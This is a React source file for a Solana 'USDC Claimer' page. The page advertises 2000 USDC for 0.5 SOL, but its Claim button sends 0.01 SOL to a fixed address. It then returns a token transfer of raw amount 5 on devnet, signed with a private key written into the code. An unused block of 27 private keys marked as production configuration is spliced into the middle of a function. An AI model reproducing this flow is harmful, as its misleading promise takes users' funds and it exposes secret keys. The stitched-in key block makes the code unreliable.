/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2MndYYMX8o158SpmJo7FeDym2D3QAnRieLwUXWEpX4bn4voffteU7KvnQJ7ysnfbhCZ93famyZjVnYddXKtCzg3H"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4QCArki1y52SJ2scr314euHexFf8k567Y6CEC7ffssVzheDqtEi7NpUeGFyAWXL8MachVmAFdz2piNuBoDZ6Rg6Q",
  "key1": "Xsps28QMnsQjvuz7M2ECU4z228VLUm6sLrRVr2KLR9AFy674P2fv6z5NCfi5Y7eStKb4xAuLgPx8u2poe2YAkcf",
  "key2": "zrRiYnX8cyJ5i8C3Tryh7NyRFjmKb15DLYpXXc2FNjkoahg9zdTR5qTPHxcN9PJtEDZTK3p3Juxuhd2CQnEqd5G",
  "key3": "KZ9kVvsRLhHMURoZ2Jx7TTtX9BmFF71VU9rJVRFsF7phmmSbZXREw68LugwgrvegLfJtXK5PMmKW1ntaJaabshA",
  "key4": "4vxn636imnhmFKodfvKVJHTWjJhdDCGPxZfh9pJ8tmHgnQ811T8XPVt4yKseKYnbSVR7fp2jJjZPzrQNhtsCbwoM",
  "key5": "4HGY5PRcgCLqGHT19fk2SRHZrtDVvSQZcxCpg34K4matTY3r8zD1RtoNyh3sJuUsVwvTNurYuKdfbxiugZAbErBQ",
  "key6": "C6rR3kakAdTX9KymqnXzyXoEi5Acp3qtTcxhbqnp894QYngvtmUaR9VyQnKuZHW4F3P3APVk5xk3VKsoP9ufCiK",
  "key7": "2BjV9L7AVCYd4my2J6tVNMLSXh3Ni9dS6NYjGq5wRP3gU7VZJ4zzqLnfq6EHssXYyKYVqt7HGFiSCj6CT98HebxS",
  "key8": "4qZwHHeFxi93SBFMuLX4gPwUQmsSSm4FeR2CneB1n4rNYGa4prktmhRqThDb4TQDCVouKJXS3vWM1YxXoHiosUfd",
  "key9": "2MY24y8npv7vr7Q6MuCnEwvem9WJz6C8wfBoDABPK5uXcK3KHYvPN1jyxEmssV4DVAbuc8eNcchoLczuZ9Y1PBfZ",
  "key10": "35XiXW8soKkqoV3drDqRLJAu8mZyc8RRp7xrRUZgbFXZgbcReBBvE1PpHnF8X5ipKhkg68Puyozrd4QuZ9cgxdKK",
  "key11": "hwG63RwEf5VncTBgZgkaT7pwLQBTq1gmrVXCf4b5U6ozfaUu4XJNwuUHecjSH55c5DG5T7fgdyVRws8Xovyc6d8",
  "key12": "5p5y5YwnANdknPwF23o3WvgG4CFAnynxccsByFbFzjD3hi2ZEUfSx58Vgdqwhs81kmDvaxf42XpngKZyZS7xo5AB",
  "key13": "2BYN5nNRtdRBJ5Bwb6P6tTyu2TjxgvVBUxAYEAmRXynhYM4EtP1tL5RnQktATxs2czUKSrML3i5cCzPav7daFYGL",
  "key14": "4vm4oXAsQGpCPHp8KUivnCmeZ3SSGft8a7zKmChLhEKP83jAiz2r7tjoo9WNNUKXvDdwmaTr3JQhFVgZ8akzD5HM",
  "key15": "66Qp9xTQCtmAs18uRX5u1wGA7fpYmPZfv1ingBexDERN2sx1rVzTMKjscqpVPRoTKR7Rbe2quV29xqeMvPiBDL3R",
  "key16": "56A6QGzJghUWxPuC1FV6kwgYZ2TuVNggZDkjCRPrRNbV7rvy6xL2KdxJvVzRVrum4nfq4F8iutR7RGfaoFZeV4k9",
  "key17": "4NYyZ8qpAZmaN4JHQDxm3UCRhDdfGQhvnaEqkYSxUe36yta9ipDAwDnweiq19GZXhX4VpHNeboQ7DDMMzxMHP5Ux",
  "key18": "45bpeZFc3yMB1LKsmg9QKwTDH7JgmiGq2REqWzfm66MR97FFRPcUY4mTYSAX3N8cxy7cHrWboTRREVLgzqjayBf3",
  "key19": "3Fb535UEYpKQP61JN1a3t1FfR7qA9N7dttD7KSK1UPzWHjW9dw3zyeLNKGRqqofPLD5aYjwB8L9Att36AfaDViDc",
  "key20": "4L9Kuuh5ha3V7wHCJkoJ7udyNXpasWCeAHgfvS2RyHdeyTzYmnmxQBM5umHmsLsStaYwsNx5vMKrzRQDdkdv8Zzk",
  "key21": "RgYLDgk64bTSSqECxYkbjej65pHRxq8EnXcKt6CuUokWcYC3RGZizTJJdZxE12GQqiHMF4dQRvdsCQT9Bg98zYZ",
  "key22": "2Gas96S9HqixiJ2ad6YDMmGPQKJP7xMUmTFfVsUw2iVFcnsg3UqqZ4YjJ23rfNRNp138nkW5qugs5DaQPRrJqCYe",
  "key23": "47nkQoYBeR4XdryNJn7yjRuih87BYAbnuM9BQ8gwULsJ5tM2ZB4xojMb6fne8mV36yAgfN6du85mF41vq2YcKUQG",
  "key24": "3KtkQToqj6ZUGpXL3dvekZeBfnc8cseZbRBiYwFwFXbztR1jQ2ZKmwakusb6qbBgJMwabKWmMxdx984MsGdUgFnw",
  "key25": "5eBE1Rm8JfjntqcpLTsZiCxoeFFwFPNQBJi784cLSoTgZ6Bt2bcRwwgTYBPzZtF5u4hEX8Nah95PwNwJC1UDJvTK",
  "key26": "vXf7oeBbjCZtwpiU1LKyhv1MhHcDoLYwpNesy7zV7G2oGBXrWXuoUFLcxkBHCwpvqA3HHP2553bmf1txnxa3L2U"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
